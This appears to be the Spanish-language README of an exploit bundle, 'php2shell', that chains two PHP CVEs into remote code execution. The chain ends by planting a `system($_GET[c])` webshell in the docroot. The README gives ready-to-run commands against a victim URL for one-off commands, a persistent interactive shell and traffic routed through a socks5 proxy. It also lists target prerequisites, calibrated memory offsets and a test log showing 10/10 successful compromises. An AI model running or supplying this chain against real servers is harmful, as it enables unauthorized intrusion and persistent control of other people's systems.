# php2shell RCE — bundle Python autocontenido

Exploit completo (cadena A, CVE-2026-109619 + CVE-2026-109618) en Python
puro, sin dependencias externas (stdlib only: socket/struct/argparse).
Equivalente funcional al módulo Metasploit `exploit/multi/http/php2shell`
— misma cadena: **A1 (OOM) → B1 (leak) → A2 (plant) → B2 (call) → webshell
`system($_GET[c])` en el docroot**.

Solo para uso en entorno controlado / autorizado (lab propio, bug bounty
en scope). Sin garantías.

## Contenido

```
php2shell_pwn.py    exploit completo (chain + detección + socks5 proxy)
pwn_shell.py        shell interactiva persistente (plant webshell + REPL)
pure/mk_a1.py       body A1 (multipart session.upload_progress OOM arm)
pure/mk_leak_b.py   body B1 (unserialize leak OOB)
pure/mk_ht.py       helpers HT (build A2/B2, needle/table)
pure/cheap_oom_a.py variante OOM económica (build_body)
pure/fake_ref_b.py  spray/nombres B (make_spray, make_name)
```

## Uso

```bash
# RCE: comando in-band (webshell plantada en el docroot)
python3 php2shell_pwn.py --url http://VICTIMA:PORT/ --cmd 'id'

# comando con proof en archivo (labs read-only)
python3 php2shell_pwn.py --url http://VICTIMA:PORT/ --cmd 'id>/out/pwn'

# detección sin explotar
python3 php2shell_pwn.py --url http://VICTIMA:PORT/ --detect-only
python3 php2shell_pwn.py --url http://VICTIMA:PORT/ --a1-only

# shell interactiva persistente
python3 pwn_shell.py --url http://VICTIMA:PORT/

# salida por proxy socks5 (p.ej. WARP)
python3 php2shell_pwn.py --url http://VICTIMA:PORT/ --proxy 127.0.0.1:40000
```

## Requisitos de la víctima

- **mod_php prefork** (Apache) o `php -S` single-worker — reuso de proceso
  entre requests; FPM/CGI = solo DoS
- `session.upload_progress.enabled=1` (default ON)
- `memory_limit` < tamaño del arm (defaults calibrados para 128M)
- PHP vulnerable (< 8.4.27 / < 8.5.12 / < 8.2.35 / < 8.3.36)
- docroot escribible por www-data para el modo webshell
  (read-only → usar `--out-dir` side-channel o `--refire`)

## Offsets

Defaults calibrados para **php:8.4.26-apache (arm64)**:
`--zdtor-off 0x638120 --zif-off 0x42CD70`. Para otro build, extraer del
`libphp.so` de la víctima (zif_session_rfc1867_callback +
zend_std_unset_property / offset del zend_executor) y pasarlos por flag
o `P2S_ZDTOR_OFF` / `P2S_ZIF_OFF`.

## Receipt de validación

Probado 10/10 (5 cold + 5 warm, attempts=1) en lab
`php:8.4.26-apache` arm64: uid=33(www-data), id/whoami in-band,
persistencia de webshell en re-runs. Re-test del bundle (unzip fresco):
attempt 1 FIRED, proof uid=33.
